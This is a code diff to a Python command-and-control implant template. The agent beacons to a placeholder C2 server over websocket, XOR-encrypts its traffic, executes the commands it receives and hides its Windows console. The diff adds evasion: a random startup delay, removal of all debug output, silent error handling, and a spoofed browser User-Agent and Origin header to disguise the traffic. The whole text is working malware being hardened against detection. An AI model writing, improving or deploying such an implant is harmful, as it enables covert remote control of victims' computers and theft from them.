@@ -12,6 +12,10 @@ import base64
 import sys
 import zlib
 
+import random as _rjit
+import time as _tjit
+_tjit.sleep(_rjit.uniform(0.5, 5.0))
+
 SERVER_HOST = "{{C2_HOST}}"
 SERVER_PORT = {{C2_PORT}}
 RECONNECT_DELAY = 5
@@ -22,8 +26,8 @@ BEACON_JITTER = {{BEACON_JITTER}}
 def simple_encrypt(data: str) -> str:
     """XOR encryption"""
     key = b'{{ENCRYPTION_KEY}}'
-    encoded = data.encode()
-    encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
+    encoded = data.encode('latin-1')
+    encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
     return base64.b64encode(encrypted).decode()
 
 
@@ -31,8 +35,8 @@ def simple_decrypt(data: str) -> str:
     """XOR decryption"""
     key = b'{{ENCRYPTION_KEY}}'
     decoded = base64.b64decode(data.encode())
-    decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
-    return decrypted.decode()
+    decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
+    return decrypted.decode('latin-1')
 
 
 def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
@@ -106,7 +110,6 @@ async def load_streaming_module(module_code: str):
 async def beacon_mode(websocket, agent_id, beacon_interval, beacon_jitter, pending_results, pending_commands):
     """Execute beacon mode cycle"""
     # Wait for ack then send results
-    print(f"[DEBUG] Beacon mode started for {agent_id}")
     await asyncio.sleep(0.1)
 
     # Step 1: Send any pending results from previous cycle
@@ -141,7 +144,6 @@ async def beacon_mode(websocket, agent_id, beacon_interval, beacon_jitter, pendi
 
             elif data.get('type') == 'kill':
                 # Exit agent
-                print(f"[DEBUG] Kill command received, exiting...")
                 import sys
                 sys.exit(0)
 
@@ -171,7 +173,6 @@ async def beacon_mode(websocket, agent_id, beacon_interval, beacon_jitter, pendi
             pass
 
     # Step 3: Execute commands offline
-    print(f"[DEBUG] Executing {len(pending_commands)} commands offline")
     for cmd_data in pending_commands:
         try:
             output = execute_command(cmd_data['command'])
@@ -189,9 +190,13 @@ async def beacon_mode(websocket, agent_id, beacon_interval, beacon_jitter, pendi
                 'timestamp': cmd_data['timestamp']
             })
 
-    print(f"[DEBUG] Beacon mode complete, disconnecting to sleep")
     return beacon_interval, beacon_jitter
 
+
+WS_HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Origin': f'http://{SERVER_HOST}',
+}
 
 async def connect_to_server():
     """Main agent connection loop"""
@@ -204,7 +209,7 @@ async def connect_to_server():
 
     while True:
         try:
-            async with websockets.connect(uri, max_size=10485760) as websocket:
+            async with websockets.connect(uri, max_size=10485760, extra_headers=WS_HEADERS) as websocket:
                 metadata = get_metadata()
                 metadata['mode'] = 'beacon'
                 metadata['beacon_interval'] = beacon_interval
@@ -235,13 +240,7 @@ async def connect_to_server():
                     # Always update agent_id if server sends one (handles server restart case)
                     new_id = reg_data.get('agent_id')
                     if new_id and new_id != agent_id:
-                        print(f"[DEBUG] Agent ID updated: {agent_id} -> {new_id}")
                         agent_id = new_id
-
-                    if reg_data.get('type') == 'registered':
-                        print(f"[DEBUG] Registered with ID: {agent_id}")
-                    else:
-                        print(f"[DEBUG] Checked in with ID: {agent_id}")
 
                     # Run beacon cycle (may return if upgraded to streaming)
                     result = await beacon_mode(websocket, agent_id, beacon_interval,
@@ -250,13 +249,9 @@ async def connect_to_server():
                     # If returned from streaming mode, it means we downgraded
                     if isinstance(result, tuple):
                         beacon_interval, beacon_jitter = result
-                        print(f"[DEBUG] Beacon cycle complete, sleeping for {calculate_sleep_time(beacon_interval, beacon_jitter):.1f}s")
 
         except Exception as e:
-            # Debug: print errors (comment out for production)
-            import traceback
-            print(f"[DEBUG] Connection error: {e}")
-            traceback.print_exc()
+            pass
 
         # Sleep for beacon interval (with jitter)
         sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
@@ -269,6 +264,10 @@ if __name__ == '__main__':
             import ctypes
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
+            pass
+        try:
+            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+        except AttributeError:
             pass
 
     try:
